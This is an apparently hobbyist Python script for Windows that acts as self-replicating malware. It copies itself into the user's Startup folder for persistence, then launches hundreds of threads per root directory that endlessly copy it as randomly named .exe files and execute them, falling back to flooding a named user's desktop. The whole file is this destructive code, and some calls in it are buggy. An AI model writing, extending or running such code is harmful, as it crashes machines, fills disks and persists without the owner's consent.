import random as r
import os 
import threading
import time
import shutil
import subprocess
import sys
import getpass

NOTI = 500
F_ex = '.exe'

def tags(): #Works
    tag = ''.join(str(r.randint(0, 9)) for _ in range(8))
    return tag

def create_1(dst, name, Active_Thread): #Prior i did not add .py/.exe and the wrong file (.txt) was being searched for
    while Active_Thread == True:

        shutil.copy(__file__, f"{dst}/{name}{F_ex}")
        subprocess.run(['start', f"{dst}/{name}{F_ex}"], shell=True)

def create_2(dst, name, Active_Thread):
     while Active_Thread == True:

        shutil.copy(__file__, f"{dst}/{name}{F_ex}")
        subprocess.run(['start', f"{dst}/{name}{F_ex}"], shell=True)

def create_file3(dst, name, Active_Thread): # Diff name, should exc when dir not avaiable. (F)

    while Active_Thread == True:
        if dst == 'F':
            shutil.copy(__file__, f"{name}{F_ex}")
            subprocess.run(['start', f"{name}{F_ex}"], shell=True)

def add_to_startup():
    user = getpass.getuser()
    startup_folder = f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
    script_path = os.path.abspath(sys.argv[0])
    shutil.copy(script_path, startup_folder)
    

def file_run(dst, name):
    #Should use any extra time to run another file.
    #LINKED to one, so every stack gets its own extra.
    subprocess.run(['start', f"{dst}/{name}{F_ex}"], shell=True)

def main():
    user = getpass.getuser()
    script_path = os.path.abspath(sys.argv[0])
    startup_folder = f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
    if script_path.startswith(startup_folder):
        # Already in startup folder, do nothing
        pass
    else:
        # Add script to startup folder
        try:
            add_to_startup()
        except:
            time.sleep(0.5)
    for dir in os.listdir('/'):
        Active_Thread = True
        CUSTOMTAG = f"FILE{tags()}" #Tag for only num 1, allows threading for second file.
        if os.path.isdir(dir):

            #print(f'\x1b[6;30;42m' + 'DIR {dir} ACESSED!' + '\x1b[0m') #For testing purposes 
            try:
                for _ in range(NOTI):
                    threading.Thread(target=create_1, args=(dir, CUSTOMTAG, Active_Thread)).start()
                    threading.Thread(target=file_run, args=(dir, CUSTOMTAG, Active_Thread)).start()
                    threading.Thread(target=create_2, args=(dir, f"FILE{tags()}", Active_Thread)).start()

                Active_Thread = False

            except:
                for _ in range(NOTI):
                    threading.Thread(target=create_file3, args=("F", f"FILE{tags()}", Active_Thread ), ).start()
                    threading.Thread(target=file_run, args=(dir, CUSTOMTAG, Active_Thread)).start()
                    threading.Thread(target=create_file3, args=("F", f"FILE{tags()}", Active_Thread)).start()

                Active_Thread = False

        else:
            for _ in range(NOTI):
                threading.Thread(target=create_1, args=("c:/Users/Sunny/OneDrive/Desktop", CUSTOMTAG, Active_Thread)).start() #If no dir was found it will spam your desktop.
                threading.Thread(target=file_run, args=("c:/Users/Sunny/OneDrive/Desktop", CUSTOMTAG, Active_Thread)).start()
            
                threading.Thread(target=create_file3, args=("F", f"FILE{tags()}", Active_Thread)).start()
                threading.Thread(target=create_file3, args=("F", f"FILE{tags()}", Active_Thread)).start()
            Active_Thread = False

if __name__ =="__main__":
    main()
